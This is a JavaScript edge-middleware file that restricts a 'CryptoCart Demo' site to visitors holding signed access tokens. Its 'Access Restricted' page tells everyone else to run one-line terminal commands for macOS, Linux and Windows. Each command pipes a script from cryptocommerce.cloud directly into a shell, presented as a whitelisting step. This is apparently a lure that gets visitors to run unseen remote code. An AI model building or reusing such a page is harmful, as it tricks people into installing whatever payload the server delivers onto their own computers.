const ACCESS_COOKIE = 'demo_access';
const TOKEN_MAX_AGE_SECONDS = 30 * 24 * 60 * 60; // 30 days

async function verifyToken(token) {
  const secret = process.env.DEMO_ACCESS_SECRET;
  if (!secret || !token) return false;

  const parts = token.split('.');
  if (parts.length !== 2) return false;
  const [payloadB64, sigB64] = parts;

  try {
    const key = await crypto.subtle.importKey(
      'raw',
      new TextEncoder().encode(secret),
      { name: 'HMAC', hash: 'SHA-256' },
      false,
      ['verify']
    );

    // base64url → binary
    const b64 = sigB64.replace(/-/g, '+').replace(/_/g, '/');
    const sigBytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
    const dataBytes = new TextEncoder().encode(payloadB64);

    const valid = await crypto.subtle.verify('HMAC', key, sigBytes, dataBytes);
    if (!valid) return false;

    // Verify not expired
    const payloadJson = JSON.parse(
      atob(payloadB64.replace(/-/g, '+').replace(/_/g, '/'))
    );
    return Date.now() - payloadJson.iat < TOKEN_MAX_AGE_SECONDS * 1000;
  } catch {
    return false;
  }
}

function parseCookie(cookieHeader, name) {
  if (!cookieHeader) return null;
  const match = cookieHeader.match(new RegExp(`(?:^|;\\s*)${name}=([^;]*)`));
  return match ? decodeURIComponent(match[1]) : null;
}

const BLOCKED_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Access Restricted — CryptoCart Demo</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{
    font-family:'Segoe UI',system-ui,sans-serif;
    background:#050a13;
    color:#e2e8f0;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:24px;
  }
  .card{
    max-width:560px;width:100%;
    background:rgba(255,255,255,.03);
    border:1px solid rgba(0,170,255,.2);
    border-radius:16px;
    padding:48px 40px;
    text-align:center;
    box-shadow:0 0 60px rgba(0,170,255,.08);
  }
  .lock{font-size:52px;margin-bottom:20px}
  h1{
    font-size:20px;font-weight:700;
    color:#fbbf24;margin-bottom:12px;
    letter-spacing:1.5px;text-transform:uppercase;
  }
  p{font-size:14px;color:#94a3b8;line-height:1.7;margin-bottom:28px}
  .label{font-size:11px;color:#64748b;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px;text-align:left}
  .cmd{
    background:rgba(0,0,0,.5);
    border:1px solid rgba(0,170,255,.25);
    border-radius:8px;
    padding:14px 18px;
    font-family:'Courier New',monospace;
    font-size:13px;color:#7dd3fc;
    text-align:left;margin-bottom:16px;
    word-break:break-all;line-height:1.6;
  }
  .btn{
    display:inline-block;margin-top:24px;
    padding:12px 28px;border-radius:8px;
    background:rgba(0,170,255,.12);
    border:1px solid rgba(0,170,255,.4);
    color:#38bdf8;font-size:14px;font-weight:600;
    text-decoration:none;
  }
  .note{font-size:12px;color:#475569;margin-top:20px}
</style>
</head>
<body>
<div class="card">
  <div class="lock">&#128274;</div>
  <h1>Access Restricted</h1>
  <p>This demo is invite-only. Run the one-line command below from your terminal to unlock access — it will automatically open the demo in your browser.</p>
  <div class="label">macOS</div>
  <div class="cmd">curl -fsSL https://www.cryptocommerce.cloud/whitelistm.sh | bash</div>
  <div class="label">Linux</div>
  <div class="cmd">wget -O- https://www.cryptocommerce.cloud/whitelistl.sh | sh</div>
  <div class="label">Windows (PowerShell)</div>
  <div class="cmd">curl -fsSL https://www.cryptocommerce.cloud/whitelist.ps1 | powershell -Command -</div>
  <a class="btn" href="https://www.cryptocommerce.cloud/demo">&#8592; View Full Instructions</a>
  <p class="note">Already ran the command? The browser should have opened automatically. If not, re-run the command.</p>
</div>
</body>
</html>`;

export default async function middleware(request) {
  const url = new URL(request.url);

  // Token delivered via URL query param (fresh whitelist — set cookie and clean URL)
  const urlToken = url.searchParams.get('token');
  if (urlToken) {
    const valid = await verifyToken(urlToken);
    if (valid) {
      url.searchParams.delete('token');
      const cookieValue = `${ACCESS_COOKIE}=${encodeURIComponent(urlToken)}; Path=/; Max-Age=${TOKEN_MAX_AGE_SECONDS}; HttpOnly; Secure; SameSite=Lax`;
      return new Response(null, {
        status: 302,
        headers: {
          Location: url.toString(),
          'Set-Cookie': cookieValue,
        },
      });
    }
  }

  // Token already stored in cookie (returning visitor)
  const cookieToken = parseCookie(request.headers.get('cookie'), ACCESS_COOKIE);
  if (cookieToken) {
    const valid = await verifyToken(cookieToken);
    if (valid) return; // pass through
  }

  // No valid token — block
  return new Response(BLOCKED_HTML, {
    status: 403,
    headers: { 'Content-Type': 'text/html; charset=utf-8' },
  });
}

export const config = {
  // Protect all routes except static assets
  matcher: ['/((?!static/|favicon\\.ico|manifest\\.json|robots\\.txt|logo).*)'],
};
